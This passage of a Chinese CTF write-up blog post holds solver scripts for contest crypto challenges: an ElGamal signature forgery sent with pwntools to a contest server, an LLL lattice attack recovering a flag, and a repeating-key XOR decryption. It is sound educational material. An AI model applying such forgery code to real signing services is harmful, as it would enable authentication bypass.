<h3 id="signature1"><a href="#signature1" class="headerlink" title="signature1"></a>signature1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python3">import pwn<br>from Crypto.Util.number import bytes_to_long, long_to_bytes<br><br># Connection details (replace if different)<br># From your screenshot:<br>HOST = &#x27;210.30.97.133&#x27;<br>PORT = 10049<br><br>try:<br>    # Establish connection<br>    conn = pwn.remote(HOST, PORT)<br>    pwn.context.log_level = &#x27;info&#x27; # Show interaction logs<br><br>    # 1. Receive public key<br>    conn.recvuntil(b&#x27;This is your public key:\n&#x27;)<br>    pubkey_str = conn.recvline().strip().decode()<br>    # Handle potential extra characters if any<br>    pubkey_str = pubkey_str.strip(&#x27;()&#x27;)<br>    p, g, y = map(int, pubkey_str.split(&#x27;, &#x27;))<br>    conn.info(f&quot;Received p = &#123;p&#125;&quot;)<br>    conn.info(f&quot;Received g = &#123;g&#125;&quot;)<br>    conn.info(f&quot;Received y = &#123;y&#125;&quot;)<br><br>    # 2. Define Target<br>    target_message = b&#x27;DUTCTF&#x27;<br>    m_target = bytes_to_long(target_message)<br>    conn.info(f&quot;Target m = &#123;m_target&#125;&quot;)<br><br>    # 3. Craft Alternative Message<br>    p_minus_1 = p - 1<br>    m_prime = m_target + p_minus_1<br>    msg_prime_bytes = long_to_bytes(m_prime)<br>    conn.info(f&quot;Crafted m&#x27; = &#123;m_prime&#125;&quot;)<br>    # Note: msg_prime_bytes might be very large<br><br>    # 4. Request Signature for the alternative message<br>    conn.recvuntil(b&#x27;Please tell me what you want to sign?\n&gt; &#x27;)<br>    conn.info(f&quot;Sending alternative message bytes (length &#123;len(msg_prime_bytes)&#125;) to sign...&quot;)<br>    conn.sendline(msg_prime_bytes)<br><br>    # Receive the signature (r, s) for msg_prime<br>    conn.recvuntil(b&#x27;This is your signature:\n&#x27;)<br>    r_line = conn.recvline().strip().decode()<br>    s_line = conn.recvline().strip().decode()<br><br>    # Extract r and s carefully<br>    try:<br>        r = int(r_line.split(&#x27;=&#x27;)[1])<br>        s = int(s_line.split(&#x27;=&#x27;)[1])<br>        conn.info(f&quot;Received r = &#123;r&#125;&quot;)<br>        conn.info(f&quot;Received s = &#123;s&#125;&quot;)<br>    except (IndexError, ValueError) as e:<br>        conn.error(f&quot;Failed to parse signature: r=&#x27;&#123;r_line&#125;&#x27;, s=&#x27;&#123;s_line&#125;&#x27;&quot;)<br>        conn.close()<br>        exit()<br><br>    # 5. Submit Signature for the original target message<br>    conn.recvuntil(b&quot;If you want to get the flag. Please tell me your signature\n&gt; &quot;)<br>    conn.info(f&quot;Sending r = &#123;r&#125;&quot;)<br>    conn.sendline(str(r).encode())<br>    conn.recvuntil(b&#x27;&gt; &#x27;) # Prompt for s<br>    conn.info(f&quot;Sending s = &#123;s&#125;&quot;)<br>    conn.sendline(str(s).encode())<br><br>    # 6. Receive the result (hopefully the flag)<br>    conn.info(&quot;Waiting for flag...&quot;)<br>    # Use recvall to get all remaining output<br>    result = conn.recvall(timeout=5) # Adjust timeout if needed<br>    conn.success(f&quot;Result: &#123;result.decode()&#125;&quot;)<br><br>    # Close connection<br>    conn.close()<br><br>except Exception as e:<br>    pwn.context.log_level = &#x27;error&#x27;<br>    conn.error(f&quot;An error occurred: &#123;e&#125;&quot;)<br>    if &#x27;conn&#x27; in locals() and conn:<br>        conn.close()<br></code></pre></td></tr></table></figure>

<h3 id="MetamikuMatrixMaster"><a href="#MetamikuMatrixMaster" class="headerlink" title="MetamikuMatrixMaster"></a>MetamikuMatrixMaster</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs python3"># Define p and c_list (ensure full c list is used)<br>p = 94951668914836210059795315483536443488933021611300220555898947046010704751659<br>c_list = [<br>    8035334017032303676884495695093849049591116586402215453176893169647528573473, 59633132506897001337475181076769716084659260056174745705282228861660454585844,<br>    28162843329479433477265065446992147859471233196414186246357440403309160334499, 4299109678466131600343618060605648056113232607349218027650135505549407963910,<br>    4087741063724374061725013462278085730705718667489149938923893312651486614669, 73854298568255274991238074779725329201544960932611944103367706659761710498656,<br>    71229461213142919346904865844975917255119439992501630368712083457562572987703, 16114686718014289723082144014633157871938855520267677347584656837586670455351,<br>    33815553137609375986764941536846486955311356747431282265813722199746367730735, 83230726604103337485693252608736987952116487439584868153421572585765208737752,<br>    43354624060867962612688844511954799809306957508254538657246407957691125473891, 55101837278890697174045987723057079542992530782626626822696566148569826190699,<br>    62604177849321207690994918211253550152229643480313270600641056287690505746500, 55392545954254989540181949652718594327551409387597584348155637070136573822824,<br>    28077377409202524772685778716251907003804101264114658216348829339456013295161, 21334443181285981988980698630756886134980141537264094330711028083765063415519,<br>    86527877688353267156038544409564951171579421083230184768315012173819906199896, 65794756895324638675873258762812358451842848189145910550661817702224116966369,<br>    22957500705937080580790222196044227350593392941014901984708370379340604555411, 55977668885664502413144853336297159131177754737530642324233093247568745687864,<br>    93062235767859648250412725812749448881541642649971084665181528969581777561465, 30474926227967272254439075001191161577976221357861668422513122909667896147233,<br>    60775836432659248756300048642443361744048616393839129752849968709547592033670, 71214544835243381339076088571162567904668832029672120026798494828609569503119,<br>    1174815806395901492096195189104319047839644470732310954592448712895225126130, 25608109273384978479485966037827618297462947734861101290796152980521502852654,<br>    84310874165903335358606830377169502406570533488803476591113974411344926639939, 24825972828150211947708356276934254637682047694949045115854000286055596575358,<br>    77671717686612226841883804936168777380412228821522967173353349296517170636360, 69846508771180325151756459684876846450893191201713121999727511653375604855218,<br>    8987813778406417907094761426890842138014909328197870288562454428726660271907, 30440204987717603713083763738703598556857003088625013718943318268794375542978,<br>    19521407840482588407487908680073693029442255108207197779397873576957114219574, 53017306130976718162852673259699032134557815647762813929925333742376644678749,<br>    15774515989940084946089586257040469965291992992385643947928102390855958180000<br>]<br><br># Ensure c is a SageMath vector<br>c = vector(Zmod(p), c_list)<br><br>n = len(c)<br><br># Convert c components to SageMath integer type ZZ<br>c_int = [ZZ(x) for x in c]<br><br># Construct the lattice basis matrix M<br>M = Matrix(ZZ, n + 1, n)<br>for i in range(n):<br>    M[i, i] = p<br>for i in range(n):<br>    M[n, i] = c_int[i]<br><br>print(&quot;Matrix M constructed. Running LLL...&quot;)<br># Run LLL<br>B = M.LLL()<br>print(&quot;LLL computation finished.&quot;)<br># print(&quot;Reduced Basis B (first few rows):&quot;) # Optional: print basis if needed<br># print(B.nrows())<br># for i in range(min(5, B.nrows())): # Print first 5 rows or fewer<br>#    print(f&quot;B[&#123;i&#125;]: &#123;B[i]&#125;&quot;)<br><br># --- Try to find the correct vector ---<br>target_vec = None<br>if B[0].is_zero():<br>    print(&quot;B[0] is the zero vector. Trying B[1]...&quot;)<br>    if B.nrows() &gt; 1 and not B[1].is_zero():<br>         target_vec = B[1]<br>         print(&quot;Using B[1] as the target vector.&quot;)<br>    else:<br>        print(&quot;B[1] is also zero or does not exist. Cannot proceed.&quot;)<br>else:<br>    # Check if B[0] magnitude seems reasonable (heuristic)<br>    # A very small norm might indicate the zero vector or an issue.<br>    # Check nbits of the first component as a rough proxy for size.<br>    if abs(B[0][0]).nbits() &gt; 100: # Expect components ~135 bits<br>        target_vec = B[0]<br>        print(&quot;Using B[0] as the target vector.&quot;)<br>    else:<br>        print(f&quot;B[0] seems potentially too small (first component has &#123;abs(B[0][0]).nbits()&#125; bits). Checking B[1]...&quot;)<br>        if B.nrows() &gt; 1 and not B[1].is_zero() and abs(B[1][0]).nbits() &gt; 100:<br>            target_vec = B[1]<br>            print(&quot;Using B[1] as the target vector.&quot;)<br>        else:<br>             print(&quot;B[1] is also zero, too small, or doesn&#x27;t exist. Defaulting back to B[0] or stopping.&quot;)<br>             # Decide whether to proceed with B[0] or stop if both seem wrong<br>             if not B[0].is_zero():<br>                 print(&quot;Proceeding with potentially small B[0].&quot;)<br>                 target_vec = B[0]<br>             else:<br>                 print(&quot;Both B[0] and B[1] seem problematic. Stopping.&quot;)<br>                 target_vec = None # Ensure we don&#x27;t proceed<br><br><br>if target_vec is None:<br>    print(&quot;Could not identify a suitable short vector from LLL basis.&quot;)<br>else:<br>    # print(f&quot;Using vector: &#123;target_vec&#125;&quot;) # Optional: print the vector being used<br>    flag = &quot;&quot;<br>    print(&quot;Attempting to recover flag from the selected vector...&quot;)<br><br>    found_flag = True<br>    possible_chars = list(range(32, 127)) # ASCII printable range<br><br>    for i, val in enumerate(target_vec): # Use enumerate to get index if needed<br>        abs_val = abs(ZZ(val))<br>        if abs_val == 0:<br>            print(f&quot;Error: Component &#123;i&#125; is zero.&quot;)<br>            flag += &quot;?&quot;<br>            found_char = False # Maintain consistency<br>            found_flag = False # Mark overall flag recovery as failed<br>            continue # Skip to the next component<br><br>        found_char = False<br>        for char_code in possible_chars:<br>            if abs_val % char_code == 0:<br>                potential_prime = abs_val // char_code<br>                # Check if quotient is non-zero and prime<br>                # Add bit size check for robustness<br>                if potential_prime != 0 and potential_prime.is_prime() and 120 &lt; potential_prime.nbits() &lt; 140:<br>                     flag += chr(char_code)<br>                     found_char = True<br>                     break # Found the correct factor<br>        if not found_char:<br>            # If no factor is found, print more info<br>            print(f&quot;Error: Could not find valid character factor for value &#123;abs_val&#125; (nbits: &#123;abs_val.nbits()&#125;) at index &#123;i&#125;&quot;)<br>            flag += &quot;?&quot;<br>            found_flag = False<br><br>    # Print final result<br>    if found_flag:<br>        print(&quot;\nSuccessfully recovered flag:&quot;)<br>        print(flag)<br>    else:<br>        print(&quot;\nCould not recover the full flag. Partial result:&quot;)<br>        print(flag)<br></code></pre></td></tr></table></figure>

<h3 id="Xxxxxxxor"><a href="#Xxxxxxxor" class="headerlink" title="Xxxxxxxor"></a>Xxxxxxxor</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python3">import binascii<br>import math<br><br># --- 本次连接获取的新数据 ---<br>key_decimal_str = &quot;129159542755632&quot;<br>ciphertext_hex = &quot;312d18e90576e487ecb33034d1e7c8737024740619e64564155759a615558407a9f6756471e7cc9634d&quot;<br># --- 数据结束 ---<br><br>try:<br>    key_decimal = int(key_decimal_str)<br><br>    # --- 根据新的数字计算密钥字节 (大端序) ---<br>    # hex(129159542755632) -&gt; 0x7558407a9f6750 -&gt; 需要 7 bytes<br>    num_bytes = 7 # 根据上面计算，这次是7字节<br>    print(f&quot;Attempting key interpretation: Decimal &#123;key_decimal&#125; -&gt; &#123;num_bytes&#125; bytes (BIG-endian)&quot;)<br>    key_bytes = key_decimal.to_bytes(num_bytes, byteorder=&#x27;big&#x27;)<br>    # 密钥应该是 b&#x27;\x75\x58\x40\x7a\x9f\x67\x50&#x27;<br><br>except ValueError:<br>    print(f&quot;Error: Could not convert &#x27;&#123;key_decimal_str&#125;&#x27; to integer.&quot;)<br>    exit()<br>except OverflowError:<br>     print(f&quot;Error: Decimal number issue with &#123;num_bytes&#125; bytes.&quot;)<br>     exit()<br><br># 将十六进制密文转换为 bytes<br>ciphertext_bytes = binascii.unhexlify(ciphertext_hex)<br>print(f&quot;Key length: &#123;len(key_bytes)&#125; bytes. Ciphertext length: &#123;len(ciphertext_bytes)&#125; bytes.&quot;) # 应该输出 7 和 49<br><br># 执行 XOR 解密<br>result_bytes = bytearray()<br>key_len = len(key_bytes)<br>if key_len == 0:<br>    print(&quot;Error: Key is empty.&quot;)<br>    exit()<br><br>for i in range(len(ciphertext_bytes)):<br>    # 密文字节与对应密钥字节（循环使用）进行 XOR<br>    xor_byte = ciphertext_bytes[i] ^ key_bytes[i % key_len]<br>    result_bytes.append(xor_byte)<br><br># 尝试将解密后的 bytes 解码为字符串<br>try:<br>    decrypted_text = result_bytes.decode(&#x27;utf-8&#x27;)<br>    print(&quot;Decrypted Text:&quot;)<br>    print(decrypted_text)<br>    # 因为 49 % 7 == 0，这次可能得到完整的 flag<br>except UnicodeDecodeError:<br>    print(&quot;Failed to decode result as UTF-8. Here are the raw bytes:&quot;)<br>    print(result_bytes)<br>    print(&quot;Hex representation of result:&quot;)<br>    print(binascii.hexlify(result_bytes).decode(&#x27;utf-8&#x27;))<br></code></pre></td></tr></table></figure>



<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="signin-1"><a href="#signin-1" class="headerlink" title="signin"></a>signin</h3><p><strong>栅栏密码</strong></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/CTF-PWN/" class="category-chain-item">CTF_PWN</a>
  
  
    <span>></span>
    
  <a href="/categories/CTF-PWN/Personal-wp/" class="category-chain-item">Personal_wp</a>
  
  

  

      </span>
    
  
</span>

    </div>
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>科技文化节</div>
      <div>http://example.com/科技文化节/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>briteny-pwn</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年4月28日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/ret2scu/" title="ret2scu">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">ret2scu</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/ACTF_2025/" title="XCTF_ACTF_2025">
                        <span class="hidden-mobile">XCTF_ACTF_2025</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  


  
  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  
      <script>
        if (!window.MathJax) {
          window.MathJax = {
            tex    : {
              inlineMath: { '[+]': [['$', '$']] }
            },
            loader : {
              load: ['ui/lazy']
            },
            options: {
              renderActions: {
                insertedScript: [200, () => {
                  document.querySelectorAll('mjx-container').forEach(node => {
                    let target = node.parentNode;
                    if (target.nodeName.toLowerCase() === 'li') {
                      target.parentNode.classList.add('has-jax');
                    }
                  });
                }, '', false]
              }
            }
          };
        } else {
          MathJax.startup.document.state(0);
          MathJax.texReset();
          MathJax.typeset();
          MathJax.typesetPromise();
        }

        Fluid.events.registerRefreshCallback(function() {
          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
            MathJax.startup.document.state(0);
            MathJax.texReset();
            MathJax.typeset();
            MathJax.typesetPromise();
          }
        });
      </script>
    

  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
